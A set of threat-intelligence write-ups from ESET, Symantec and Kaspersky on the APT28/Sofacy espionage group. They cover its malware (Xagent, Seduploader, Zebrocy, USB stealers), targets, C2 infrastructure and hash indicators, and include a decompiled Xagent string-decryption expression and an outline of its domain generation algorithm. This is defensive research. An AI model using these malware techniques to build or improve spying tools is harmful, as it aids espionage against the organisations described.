worldwide.\\nTooling\\nThe previous section shows how the Sednit group spent the last year from the infection-vector point of view. This section describes changes that this group made to their toolset. In 2016, ESET released a deep analysis of each component; it is available here.\\nOver the years the group developed a lot of components to infect, gather and steal information from their targets. Some of these components have disappeared since, while others have been improved.\\nSeduploader\\nSeduploader serves as reconnaissance malware. It is made up of two distinct components: a dropper, and the persistent payload installed by this dropper. Seduploader is still used by the Sednit group but it has received a few improvements. During the April 2017 campaign a new version of Seduploader came out with some new features, such as a screenshot function or the ability to directly execute loaded into memory from the C&C server. Recently, we have seen the Seduploader dropper replaced by PowerShell commands delivering the Seduploader payload.\\nXtunnel\\nXtunnel is a network proxy tool that can relay any kind of network trace between a C&C server on the Internet and an endpoint computer inside a local network. Xtunnel is still used by the Sednit group.\\nSedkit\\nSedkit is the Sednit exploit-kit; it’s used only for targeted attacks, starting with targeted phishing emails with URLs that spoof legitimate URLs. October 2016 is the last time we’re aware that Sedkit was used.\\nSedreco\\nSedreco serves as a spying backdoor; its functionalities can be extended with dynamically loaded plugins. It is made up of two distinct components: a dropper and the persistent payload installed by this dropper. We have not seen this component since April 2016.\\nUSBStealer\\nUSBStealer serves as a network tool that extracts sensitive information from air-gapped networks. We have not seen this component since mid 2015.\\nXagent\\nXagent is a modular backdoor with spying functionalities such as keystroke logging and file exfiltration. Xagent is the group’s flagship backdoor and heavily used in their operations. Early versions for Linux and Windows were seen years ago, then in 2015 an iOS version came out. One year later, an Android version was discovered and finally, in the beginning of 2017, an Xagent sample for OS X was described.\\nWe saw a new version of the Windows version of Xagent last February. Because of the following strings found in the binaries, we deduced that it was version 4 of the backdoor. The different versions of Xagent’s modules are listed in Table 1.\\nTable 1. Xagent versioning\\nmodule/channelv3 uidv4 uid\\nAgentKernel33034401\\nWinHttp21114402\\nModuleFileSystem21034411\\nModuleRemoteKeyLogger21074412\\nProcessRetranslatorModule21064413\\nUnknown 1??4414\\nVersion 4 of Xagent came with new techniques for strings obfuscation and all Run-time type information (RTTI) are obfuscated as well. These techniques significantly improve the way in which strings are encrypted with a method unique to each binary. Previous versions of Xagent used an XOR loop to decrypt strings. The new encryption algorithm is a series of operations with values probably generated at the compile time. The following figure illustrates the complexity of the code.\\nHowever, the HexRays decompiler does a decent job of simplifying it. Here is an example:\\nC\\nreturn (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 - 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - 65) ^ 0xA) % 256;\\n1\\nreturn (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 - 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - 65) ^ 0xA) % 256;\\nThe AgentKernel can receive commands from the C&C server to interact with modules and channels. Some of the previously-seen C&C commands have been removed, and some new ones added.\\nEarlier versions supported command 2, PING_REQUEST. This has been removed in version 4 but the operator can still get the list of modules with the command GET_AGENT_INFO, which is more verbose than the previous command. Commands 34, 35 and 36 showed similarities with SET_PARAMETERS, which allows interaction with LocalStorage, which is the kernel store. It contains both file-based storage for communication with the C&C server and Microsoft registry base storage to store various configuration parameters.\\nA new feature implemented in the WinHttp channel is a Domain Generation algorithm (DGA) for fallback domains. The WinHttp channel is the channel responsible for communicating with the C&C server. Unlike the usual DGA that retrieves its seed from pseudo-random numbers, this one gets a given seed (probably generated at compilation) for a given sample. The way that domains are generated is as follows:\\na suite of operations are applied to the seed\\nthe result gives an offset for three different arrays (adding another seed for each array)\\nonce the new offset is calculated (offset + seed), it decrypts the word\\nall words are concatenated (four words are used to generate the domain; the fourth word came from the first array but with a different offset)\\nthe “.com” suffix is added.\\nThe development of the backdoor with the addition of new features and compatibility with all major platforms out there make Xagent the core backdoor used by the group.\\nDealersChoice\\nDealersChoice is a platform that generates malicious documents containing embedded Adobe Flash files. Palo Alto Network researchers analyzed two variants\\u2009—\\u2009variant A, which is a standalone variant including Flash exploit code packaged with a payload, and variant B, which is a modular variant that loads \\xa0exploit code on demand. This new component appeared in 2016 and is still in use.\\nDowndelph\\nDowndelph is a lightweight downloader developed in the Delphi programming language. As we already mentioned in our white paper, its period of activity was from November 2013 to September 2015 and there have been no new variants seen since.\\nSummary\\nThe Sednit group is without a doubt still an active group. The main entry point for their flagship backdoor is phishing emails, and they seem to have a great deal of success with that technique. Xagent is the core of their operation, which we can now find on any and all major \\xa0platforms, mobile or not. The newest version of Xagent is very interesting and the operators seem to have put a lot of work into it. We have seen since the discovery two instances of Xagent in the wild\\u2009—\\u2009one with the channel and the unknown module\\u2009—\\u2009one with all modules and channel but without the unknown module. We can hypothesize that the Sednit group added another layer of checking on its targets by dropping an Xagent with just a few modules and if the victim is interesting enough, it will drop another version with all modules.\\nIoCs\\nTable 2.

Click for details.Critical Attack Discovery and Intelligence TeamSymantecPosted: 4 Oct, 20185 Min ReadElection Security SubscribeAPT28: New Espionage Operations Target Military and Government OrganizationsRecent campaigns see APT28 group return to covert intelligence gathering operations in Europe and South America.After making headlines during 2016 due to its involvement in cyber attacks against an organization involved in the U.S. presidential election, APT28 (aka Swallowtail, Fancy Bear) has continued to mount operations during 2017 and 2018.\\nThe espionage group, which according to the U.S. Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) is linked to the Russian government, returned to low-key intelligence-gathering operations during 2017 and into 2018, targeting a range of military and government targets in Europe and South America.\\nHistory of disruptive attacks\\nAPT28 has been active since at least January 2007 but received public attention in a major way during 2016 when it was implicated in a series of cyber attacks in the run up to the U.S. presidential election.\\nBeginning in the Spring of 2016, APT28 sent spear-phishing emails to political targets including members of the Democratic National Committee (DNC). These emails were designed to trick recipients into supposedly changing their email passwords on a fake webmail domain. The attack group then used these stolen credentials to gain access to the DNC network, install malware, move across the network, and steal data, including a trove of emails. The compromised information was later leaked online.\\nThese election attacks signaled a change of tactics on the part of APT28, moving away from their prior low-key intelligence gathering towards more overt activity, seemingly intended to destabilize and disrupt victim organizations and countries.\\nThe group was also responsible for the 2016 attack on the World Anti Doping Agency (WADA) and the leaking of confidential drug testing information. In keeping with its shift to more overt tactics, the group appeared to publicly take credit for the attack, leaking the information on a website using the name “Fancy Bears”, an industry codename that was already widely used for the group.\\nReturn to the shadows\\nAfter receiving an unprecedented amount of attention in 2016, APT28 has continued to mount operations during 2017 and 2018. However, the group’s activities since the beginning of 2017 have again become more covert and appear to be mainly motivated by intelligence gathering.\\nThe organizations targeted by APT28 during 2017 and 2018 include:\\nA well-known international organization\\nMilitary targets in Europe\\nGovernments in Europe\\nA government of a South American country\\nAn embassy belonging to an Eastern European country\\nOngoing development of tools\\nAPT28 uses a number of tools to compromise its targets. The group’s primary malware is Sofacy, which has two main components. Trojan.Sofacy (also known as Seduploader) performs basic reconnaissance on an infected computer and can download further malware. Backdoor.SofacyX (also known as X-Agent) is a second stage piece of malware, capable of stealing information from the infected computer. A Mac version of the Trojan also exists (OSX.Sofacy).\\nAPT28 has continued to develop its tools over the past two years. For example, Trojan.Shunnael (aka X-Tunnel), malware used to maintain access to infected networks using an encrypted tunnel, underwent a rewrite to .NET.\\nIn addition to this, as reported by our peers at ESET last week, the group has also begun using a UEFI (Unified Extensible Firmware Interface) rootkit known as Lojax. Because the rootkit resides within a computer’s flash memory, it allows the attackers to maintain a persistent presence on a compromised machine even if the hard drive is replaced or the operating system is reinstalled. Symantec products block attempts to install Lojax with the detection name Trojan.Lojax.\\nPossible links to other espionage operations\\nAnother attack group, Earworm (aka Zebrocy), has been active since at least May 2016 and is involved in what appears to be intelligence gathering operations against military targets in Europe, Central Asia, and Eastern Asia. The group uses spear-phishing emails to compromise its targets and infect them with malware.\\nEarworm uses two malware tools. Trojan.Zekapab is a downloader component that is capable of carrying out basic reconnaissance functions and downloading additional malware to the infected computer. Backdoor.Zekapab is installed on selected infected computers and is capable of taking screenshots, executing files and commands, uploading and downloading files, performing registry and file system operations, and carrying out system information tasks. Earworm has also on occasion installed additional tools onto infected computers for the purposes of keylogging and password capture.\\nDuring 2016, Symantec observed some overlap between the command and control (C&C) infrastructure used by Earworm and the C&C infrastructure used by Grizzly Steppe (the U.S. government code name for APT28 and related actors), implying a potential connection between Earworm and APT28. However, Earworm also appears to conduct separate operations from APT28 and thus Symantec tracks them as a distinct group.\\nAn ongoing threat\\nIt is now clear that after being implicated in the U.S. presidential election attacks in late 2016, APT28 was undeterred by the resulting publicity and continues to mount further attacks using its existing tools. After its foray into overt and disruptive attacks in 2016, the group has subsequently returned to its roots, mounting intelligence gathering operations against a range of targets. This ongoing activity and the fact that APT28 continues to refine its toolset means that the group will likely continue to pose a significant threat to nation state targets.\\nProtection\\nSymantec has had the following protections in place to protect customers against APT28 attacks:\\nTrojan.Sofacy\\nBackdoor.SofacyX\\nInfostealer.Sofacy\\nOSX.Sofacy\\nTrojan.Shunnael\\nTrojan.Lojax\\nThe following protections are in place to protect customers against Earworm attacks:\\nTrojan.Zekapab\\nBackdoor.Zekapab\\nThreat Intelligence\\nCustomers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have received reports on the “Swallowtail” (also known as APT28), which detail methods of detecting and thwarting activities of this adversary.\\nFile AttachmentsAPT28 indicators of compromiseTXT1.77 KBAbout the AuthorCritical Attack Discovery and Intelligence TeamSymantecThe Critical Attack Discovery and Intelligence team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.Related Blog PostsPosted: 30 Oct, 20193 Min ReadIs the Electoral System Cyber Secure for 2020?Posted: 5 Sep, 20193 Min ReadAs 2020 Looms, Clock Ticking in Race to Enforce Stronger Election SecurityPosted: 5 Jun, 20195 Min ReadAs Europe Went to the Polls, Cyber Election Efforts Paid OffPosted: 21 Mar, 20194 Min ReadWhat States Are Getting Right – and Wrong – about Election Security SubscribePrivacy PolicyCookie PolicyData Processing and Data TransfersSupplier ResponsibilityTerms of UseSitemap© 2015-2020 Broadcom.

high profile targets with updated toolset\\nBy GReAT\\non December 4, 2015. 10:59 am\\nSofacy (also known as “Fancy Bear”, “Sednit”, “STRONTIUM” and “APT28”) is an advanced threat group that has been active since around 2008, targeting mostly military and government entities worldwide, with a focus on NATO countries.\\nMore recently, we have also seen an increase in activity targeting Ukraine.\\nBack in 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as its first stage malware. The implant shared certain similarities with the old Miniduke implants. This led us to believe the two groups were connected, at least to begin with, although it appears they parted ways in 2014, with the original Miniduke group switching to the CosmicDuke implant.\\nAt some point during 2013, the Sofacy group expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across four to five generations) and a few others. We’ve seen quite a few versions of these implants and they were relatively widespread for a time.\\n#Sofacy group has been active since 2008, targeting mostly military and government entities in NATO countriesTweet\\nEarlier this year, we noticed a new release of the AZZY implant which, at the time, was largely undetected by anti-malware products. We observed several waves of attacks using this version, most recently in October. The new waves of attacks also included a new generation of USB stealers deployed by the Sofacy actor, with the first versions dating back to February 2015, and which appear to be geared exclusively towards high profile targets.\\nSofacy’s August 2015 attack wave\\nIn the months leading up to August, the Sofacy group launched several waves of attacks relying on zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player and Windows itself. For instance, its JHUHUGIT implant was delivered through a Flash zero-day and used a Windows EoP exploit to break out of the sandbox. The JHUHUGIT implant became a relatively popular first stage for the Sofacy attacks and was used again with a Java zero-day (CVE-2015-2590) in July 2015.\\nWhile the JHUHUGIT (and more recently, “JKEYSKW”) implant used in most of the Sofacy attacks, high profile victims are being targeted with another first level implant, representing the latest evolution of their AZZYTrojan.\\nTwo recurring characteristics of the #Sofacy group are speed and the use of multi-backdoor packagesTweet\\nThe first versions of the new AZZY implant appeared in August of this year. During a high profile incident we investigated, our products successfully detected and blocked a “standard” Sofacy “AZZY” sample that was used to target a range of defense contractors. The sample used in this attack (md5 A96F4B8AC7AA9DBF4624424B7602D4F7, compiled July 29th, 2015) was a pretty standard Sofacy x64 AZZY implant, which has the internal name “advshellstore.dll”.\\nInterestingly, the fact that the attack was blocked didn’t appear to stop the Sofacy team. Just an hour and a half later they had compiled and delivered another AZZY x64 backdoor (md5: 9D2F9E19DB8C20DC0D20D50869C7A373, compiled August 4th, 2015). This was no longer detectable with static signatures by our product. However, it was detected dynamically by the host intrusion prevention subsystem when it appeared in the system and was executed.\\nThis recurring, blindingly-fast Sofacy attack attracted our attention as neither sample was delivered through a zero-day vulnerability — instead, they appeared to be downloaded and installed by another malware. This separate malware was installed by an unknown attack as “AppData\\\\Local\\\\Microsoft\\\\Windows\\\\msdeltemp.dll” (md5: CE8B99DF8642C065B6AF43FDE1F786A3).\\nThe top level malware, CE8B99DF8642C065B6AF43FDE1F786A3 (named by its authors “msdeltemp.dll” according to internal strings, and compiled July 28th, 2015) is a rare type of the Sofacy AZZY implant.\\nIt has been modified to drop a separate C&C helper, (md5: 8C4D896957C36EC4ABEB07B2802268B9) as “tf394kv.dll“.\\nThe dropped “tf394kv.dll” file is an external C&C communications library, compiled on July 24th, 2015 and used by the main backdoor for all Internet-based communications.\\nDecrypted configuration block of the C&C helper library “tf394kv.dll“\\nThis code modification marks an unusual departure from the typical AZZY backdoors, with its C&C communication functions moved to an external DLL file. In the past, the Sofacy developers modified earlier AZZY backdoors to use a C&C server encoded in the registry, instead of storing it in the malware itself, so this code modularisation follows the same line of thinking.\\nIn addition to the new AZZY backdoors with side-DLL for C&C, we observed a new set of data-theft modules deployed against victims by the Sofacy group. Among the most popular modern defense mechanisms against APTs are air-gaps — isolated network segments without Internet access, where sensitive data is stored. In the past, we’ve seen groups such as Equation and Flame use malware to steal data from air-gapped networks. The Sofacy group uses such tools as well.\\nThe first versions of these new USB stealer modules appeared around February 2015 and the latest appear to have been compiled in May 2015. Older versions of these USBSTEALER modules were previously described by our colleagues from ESET.\\nOne example of the new Sofacy USBSTEALER modules is 8b238931a7f64fddcad3057a96855f6c, which is named internally as msdetltemp.dll.\\nThis data theft module appears to have been compiled in May 2015 and is designed to watch removable drives and collect files from them, depending on a set of rules defined by the attackers. The stolen data is copied into a hidden directory as “%MYPICTURES%\\\\%volume serial number%“, from where it can be exfiltrated by the attackers using one of the AZZY implants. More details on the new USB stealers are available in the section on technical analysis.\\nConclusions\\nOver the last year, the Sofacy group has increased its activity almost tenfold when compared to previous years, becoming one of the most prolific, agile and dynamic threat actors in the arena. This activity spiked in July 2015, when the group dropped two completely new exploits, an Office and Java zero-day.\\nAt the beginning of August, Sofacy began a new wave of attacks, focusing on\\ndefense-related targets. As of November 2015, this wave of attacks is ongoing. The attackers deploy a rare modification of the AZZY backdoor, which is used for the initial reconnaissance. Once a foothold is established, they try to upload more backdoors, USB stealers as well as other hacking tools such as “Mimikatz” for lateral movement.\\nOver the last year, the #Sofacy group has increased its activity almost tenfold, that spiked in July 2015Tweet\\nTwo recurring characteristics of the Sofacy group that we keep seeing in its attacks are speed and the use of multi-backdoor packages for extreme resilience. In the past, the group used droppers that installed both the SPLM and AZZY backdoors on the same machine. If one of them was detected, the other one provided the attacker with continued access.\\nAs usual, the best defense against targeted attacks is a multi-layered approach. Combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and default-deny strategies. According to a study by the Australian DSD, 85% of the targeted attacks analysed could have been stopped by four simple defense strategies. While it’s impossible to achieve 100% protection, in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker – who will just give up and move on to other targets.\\nMore information about the Sofacy group is available to customers of Kaspersky Intelligent Services.\\nIs there a ‘silver bullet’ to protect yourself against Sofacy?

Sofacy Activity\\nBy GReAT\\non February 20, 2018. 2:00 pm\\nSofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.\\nThis high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.\\nIn 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We’ve seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets.\\nSofacy’s reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group’s activities in 2016, especially when data from the compromise was leaked and “weaponized”. And later 2016, their focus turned towards the Olympics’ and the World Anti-Doping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like “anonpoland”, and data from victimized organizations were similarly leaked and “weaponized”.\\nThis write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has 100% global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer’s Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East.\\nDealer’s Choice\\nThe beginning of 2017 began with a slow cleanup following the Dealer’s Choice campaign, with technical characteristics documented by our colleagues at Palo Alto in several stages at the end of 2016. The group spearphished targets in several waves with Flash exploits leading to their carberp based JHUHUGIT downloaders and further stages of malware. It seems that many folks did not log in and pull down their emails until Jan 2017 to retrieve the Dealer’s Choice spearphish. Throughout these waves, we observed that the targets provided connection, even tangential, to Ukraine and NATO military and diplomatic interests.\\nIn multiple cases, Sofacy spoofs the identity of a target, and emails a spearphish to other targets of interest. Often these are military or military-technology and manufacturing related, and here, the DealersChoice spearphish is again NATO related:\\nThe global reach that coincided with this focus on NATO and the Ukraine couldn’t be overstated. Our KSN data showed spearphishing targets geolocated across the globe into 2017.\\nAM, AZ, FR, DE, IQ, IT, KG, MA, CH, UA, US, VN\\nDealersChoice emails, like the one above, that we were able to recover from third party sources provided additional targeting insight, and confirmed some of the targeting within our KSN data:\\nTR, PL, BA, AZ, KR, LV, GE, LV, AU, SE, BE\\n0day Deployment(s)\\nSofacy kicked off the year deploying two 0day in a spearphish document, both a Microsoft Office encapsulated postscript type confusion exploit (abusing CVE-2017-0262) and an escalation of privilege use-after-free exploit (abusing CVE-2017-0263). The group attempted to deploy this spearphish attachment to push a small 30kb backdoor known as GAMEFISH to targets in Europe at the beginning of 2017. They took advantage of the Syrian military conflict for thematic content and file naming “Trump’s_Attack_on_Syria_English.docx”. Again, this deployment was likely a part of their focus on NATO targets.\\nLight SPLM deployment in Central Asia and Consistent Infrastructure\\nMeanwhile in early-to-mid 2017, SPLM/CHOPSTICK/XAgent detections in Central Asia provided a glimpse into ongoing focus on ex-Soviet republics in Central Asia. These particular detections are interesting because they indicate an attempted selective 2nd stage deployment of a backdoor maintaining filestealer, keylogger, and remoteshell functionality to a system of interest. As the latest revision of the backdoor, portions of SPLM didn’t match previous reports on SPLM/XAgent while other similarities were maintained. SPLM 64-bit modules already appeared to be at version 4 of the software by May of the year. Targeting profiles included defense related commercial and military organizations, and telecommunications.\\nTargeting included TR, KZ, AM, KG, JO, UK, UZ\\nHeavy Zebrocy deployments\\nSince mid-November 2015, the threat actor referred to as “Sofacy” or “APT28” has been utilizing a unique payload and delivery mechanism written in Delphi and AutoIT. We collectively refer to this package and related activity as “Zebrocy” and had written a few reports on its usage and development by June 2017 – Sofacy developers modified and redeployed incremented versions of the malware. The Zebrocy chain follows a pattern: spearphish attachment -> compiled Autoit script (downloader) -> Zebrocy payload. In some deployments, we observed Sofacy actively developing and deploying a new package to a much smaller, specific subset of targets within the broader set.\\nTargeting profiles, spearphish filenames, and lures carry thematic content related to visa applications and scanned images, border control administration, and various administrative notes. Targeting appears to be widely spread across the Middle East, Europe, and Asia:\\nBusiness accounting practices and standards\\nScience and engineering centers\\nIndustrial and hydrochemical engineering and standards/certification\\nMinistry of foreign affairs\\nEmbassies and consulates\\nNational security and intelligence agencies\\nPress services\\nTranslation services\\nNGO – family and social service\\nMinistry of energy and industry\\nWe identified new MSIL components deployed by Zebrocy. While recent Zebrocy versioning was 7.1, some of the related Zebrocy modules that drop file-stealing MSIL modules we call Covfacy were v7.0. The components were an unexpected inclusion in this particular toolset. For example, one sent out to a handful of countries identifies network drives when they are added to target systems, and then RC4-like-encrypts and writes certain file metadata and contents to a local path for later exfiltration. The stealer searches for files 60mb and less with these extensions:\\n.doc\\n.docx\\n.xls\\n.xlsx\\n.ppt\\n.pptx\\n.exe\\n.zip\\n.rar\\nAt execution, it installs an application-defined Windows hook. The hook gets windows messages indicating when a network drive has been attached. Upon adding a network drive, the hook calls its “RecordToFile” file stealer method.\\nZebrocy spearphishing targets:\\nAF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZ\\nSPLM deployment in Central Asia\\nSPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy. Earlier SPLM activity deployed 32-bit modules over unencrypted http (and sometimes smtp) sessions. In 2016 we saw fully functional, very large SPLM/X-Agent modules supporting OS X.\\nThe executable module continues to be part of a framework supporting various internal and external components communicating over internal and external channels, maintaining slightly morphed encryption and functionality per deployment. Sofacy selectively used SPLM/CHOPSTICK modules as second stage implants to high interest targets for years now. In a change from previous compilations, the module was structured and used to inject remote shell, keylogger, and filesystem add-ons into processes running on victim systems and maintaining functionality that was originally present within the main module.\\nThe newer SPLM modules are deployed mostly to Central Asian based targets that may have a tie to NATO in some form. These targets include foreign affairs government organizations both localized and abroad, and defense organizations’ presence localized, located in Europe and also located in Afghanistan. One outlier SPLM target profile within our visibility includes an audit and consulting firm in Bosnia and Herzegovina.\\nMinor changes and updates to the code were released with these deployments, including a new mutex format and the exclusive use of encrypted HTTP communications over TLS. The compiled code itself already is altered per deployment in multiple subtle ways, in order to stymie identification and automated analysis and accommodate targeted environments. Strings (c2 domains and functionality, error messages, etc) are custom encrypted per deployment.\\nTargets: TR, KZ, BA, TM, AF, DE, LT, NL\\nSPLM/CHOPSTICK/XAgent Modularity and Infrastructure\\nThis subset of SPLM/CHOPSTICK activity leads into several small surprises that take us into 2018, to be discussed in further detail at SAS 2018. The group demonstrates malleability and innovation in maintaining and producing familiar SPLM functionality, but the pragmatic and systematic approach towards producing undetected or difficult-to-detect malware continues. Changes in the second stage SPLM backdoor are refined, making the code reliably modular.\\nInfrastructure Notes\\nSofacy set up and maintained multiple servers and c2 for varying durations, registering fairly recognizable domains with privacy services, registrars that accept bitcoin, fake phone numbers, phony individual names, and 1 to 1 email address to domain registration relationships. Some of this activity and patterns were publicly disclosed, so we expect to see more change in their process in 2018. Also, throughout the year and in previous years, researchers began to comment publicly on Sofacy’s fairly consistent infrastructure setup.\\nAs always, attackers make mistakes and give away hints about what providers and registrars they prefer. It’s interesting to note that this version of SPLM implements communications that are fully encrypted over HTTPS. As an example, we might see extraneous data in their SSL/TLS certificates that give away information about their provider or resources. Leading up to summer 2017, infrastructure mostly was created with PDR and Internet Domain Service BS Corp, and their resellers. Hosting mostly was provided at Fast Serv Inc and resellers, in all likelihood related to bitcoin payment processing.\\nAccordingly, the server side certificates appear to be generated locally on VPS hosts that exclusively are paid for at providers with bitcoin merchant processing. One certificate was generated locally on what appeared to be a HP-UX box, and another was generated on “8569985.securefastserver.com” with an email address “root@8569985.securefastserver.com”, as seen here for their nethostnet.com domain. This certificate configuration is ignored by the malware.\\nIn addition to other ip data, this data point suggested that Qhoster at https://www.qhoster.com was a VPS hosting reseller of choice at the time. It should be noted that the reseller accepted Alfa Click, PayPal, Payza, Neteller, Skrill, WebMoney, Perfect Money, Bitcoin, Litecoin, SolidTrust Pay, CashU, Ukash, OKPAY, EgoPay, paysafecard, Alipay, MG, Western Union, SOFORT Banking, QIWI, Bank transfer for payment.\\nConclusion\\nSofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We’ll cover more recent 2018 change in their targeting and the malware itself at SAS 2018.\\nWith a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important.\\nTechnical Appendix\\nRelated md5\\n8f9f697aa6697acee70336f66f295837\\n1a4b9a6b321da199aa6d10180e889313\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\n1421419d1be31f1f9ea60e8ed87277db\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\n953c7321c4959655fdd53302550ce02d\\n57601d717fcf358220340675f8d63c8a\\n02b79c468c38c4312429a499fa4f6c81\\n85cd38f9e2c9397a18013a8921841a04\\nf8e92d8b5488ea76c40601c8f1a08790\\n66b4fb539806ce27be184b6735584339\\ne8e1fcf757fe06be13bead43eaa1338c\\n953c7321c4959655fdd53302550ce02d\\naa2aac4606405d61c7e53140d35d7671\\n85cd38f9e2c9397a18013a8921841a04\\n57601d717fcf358220340675f8d63c8a\\n16e1ca26bc66e30bfa52f8a08846613d\\nf8e92d8b5488ea76c40601c8f1a08790\\nb137c809e3bf11f2f5d867a6f4215f95\\n237e6dcbc6af50ef5f5211818522c463\\n88009adca35560810ec220544e4fb6aa\\n2163a33330ae5786d3e984db09b2d9d2\\n02b79c468c38c4312429a499fa4f6c81\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\nb88633376fbb144971dcb503f72fd192\\n8f9f697aa6697acee70336f66f295837\\nb6f77273cbde76896a36e32b0c0540e1\\n1a4b9a6b321da199aa6d10180e889313\\n1421419d1be31f1f9ea60e8ed87277db\\n1a4b9a6b321da199aa6d10180e889313\\n9b10685b774a783eabfecdb6119a8aa3\\naa34fb2e5849bff4144a1c98a8158970\\naced5525ba0d4f44ffd01c4db2730a34\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\nb924ff83d9120d934bb49a7a2e3c4292\\ncdb58c2999eeda58a9d0c70f910d1195\\nd4a5d44184333442f5015699c2b8af28\\nd6f2bf2066e053e58fe8bcd39cb2e9ad\\n34dc9a69f33ba93e631cd5048d9f2624\\n1c6f8eba504f2f429abf362626545c79\\n139c9ac0776804714ebe8b8d35a04641\\ne228cd74103dc069663bb87d4f22d7d5\\nbed5bc0a8aae2662ea5d2484f80c1760\\n8c3f5f1fff999bc783062dd50357be79\\n5882a8dd4446abd137c05d2451b85fea\\n296c956fe429cedd1b64b78e66797122\\n82f06d7157dd28a75f1fbb47728aea25\\n9a975e0ddd32c0deef1318c485358b20\\n529424eae07677834a770aaa431e6c54\\n4cafde8fa7d9e67194d4edd4f2adb92b\\nf6b2ef4daf1b78802548d3e6d4de7ba7\\nede5d82bb6775a9b1659dccb699fadcb\\n116d2fc1665ce7524826a624be0ded1c\\n20ff290b8393f006eaf4358f09f13e99\\n4b02dfdfd44df3c88b0ca8c2327843a4\\nc789ec7537e300411d523aef74407a5e\\n0b32e65caf653d77cab2a866ee2d9dbc\\n27faa10d1bec1a25f66e88645c695016\\n647edddf61954822ddb7ab3341f9a6c5\\n2f04b8eb993ca4a3d98607824a10acfb\\n9fe3a0fb3304d749aeed2c3e2e5787eb\\n62deab0e5d61d6bf9e0ba83d9e1d7e2b\\n86b607fe63c76b3d808f84969cb1a781\\nf62182cf0ab94b3c97b0261547dfc6cf\\n504182aaa5575bb38bf584839beb6d51\\nd79a21970cad03e22440ea66bd85931f\\nRelated 